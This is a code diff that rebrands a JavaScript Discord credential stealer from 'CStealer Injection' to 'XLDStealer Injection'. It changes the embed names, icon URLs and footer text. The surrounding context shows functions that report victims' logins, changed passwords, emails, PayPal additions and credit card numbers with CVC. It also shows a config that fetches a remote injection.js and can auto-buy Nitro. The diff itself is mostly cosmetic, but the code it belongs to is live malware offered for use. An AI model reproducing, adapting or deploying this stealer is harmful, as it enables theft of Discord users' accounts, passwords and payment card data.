@@ -11,8 +11,8 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'CStealer Injection', 
-  embed_icon: 'https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png'.replace(/ /g, '%20'), 
+  embed_name: 'XLDStealer Injection', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/666441511868563469/1268191282338205757/mamun25g220916498.jpg?ex=66ab86ab&is=66aa352b&hm=b75b9af3529eb776ffd8f9d8b076f1fb65265b48a51f4abe8aadc167ee169e42&'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/wtfXLDStealerwtf/index/main/injection.js', 
   /**
@@ -681,7 +681,7 @@ const login = async (email, password, token) => {
         },
         footer: {
             text: 'XLDStealer Injection・https://discord.gg/210',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            icon_url: "https://cdn.discordapp.com/attachments/666441511868563469/1268191282338205757/mamun25g220916498.jpg?ex=66ab86ab&is=66aa352b&hm=b75b9af3529eb776ffd8f9d8b076f1fb65265b48a51f4abe8aadc167ee169e42&"
         },
       },
     ],
@@ -724,7 +724,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         },
         footer: {
             text: 'XLDStealer Injection・https://discord.gg/210',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            icon_url: "https://cdn.discordapp.com/attachments/666441511868563469/1268191282338205757/mamun25g220916498.jpg?ex=66ab86ab&is=66aa352b&hm=b75b9af3529eb776ffd8f9d8b076f1fb65265b48a51f4abe8aadc167ee169e42&"
         },
       },
     ],
@@ -767,7 +767,7 @@ const emailChanged = async (email, password, token) => {
         },
         footer: {
             text: 'XLDStealer Injection・https://discord.gg/210',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            icon_url: "https://cdn.discordapp.com/attachments/666441511868563469/1268191282338205757/mamun25g220916498.jpg?ex=66ab86ab&is=66aa352b&hm=b75b9af3529eb776ffd8f9d8b076f1fb65265b48a51f4abe8aadc167ee169e42&"
         },
       },
     ],
@@ -810,7 +810,7 @@ const PaypalAdded = async (token) => {
         },
         footer: {
             text: 'XLDStealer Injection・https://discord.gg/210',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            icon_url: "https://cdn.discordapp.com/attachments/666441511868563469/1268191282338205757/mamun25g220916498.jpg?ex=66ab86ab&is=66aa352b&hm=b75b9af3529eb776ffd8f9d8b076f1fb65265b48a51f4abe8aadc167ee169e42&"
         },
       },
     ],
@@ -853,7 +853,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         },
         footer: {
             text: 'XLDStealer Injection・https://discord.gg/210',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            icon_url: "https://cdn.discordapp.com/attachments/666441511868563469/1268191282338205757/mamun25g220916498.jpg?ex=66ab86ab&is=66aa352b&hm=b75b9af3529eb776ffd8f9d8b076f1fb65265b48a51f4abe8aadc167ee169e42&"
         },
       },
     ],
@@ -898,7 +898,7 @@ const nitroBought = async (token) => {
         },
         footer: {
             text: 'XLDStealer Injection・https://discord.gg/210',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            icon_url: "https://cdn.discordapp.com/attachments/666441511868563469/1268191282338205757/mamun25g220916498.jpg?ex=66ab86ab&is=66aa352b&hm=b75b9af3529eb776ffd8f9d8b076f1fb65265b48a51f4abe8aadc167ee169e42&"
         },
       },
     ],
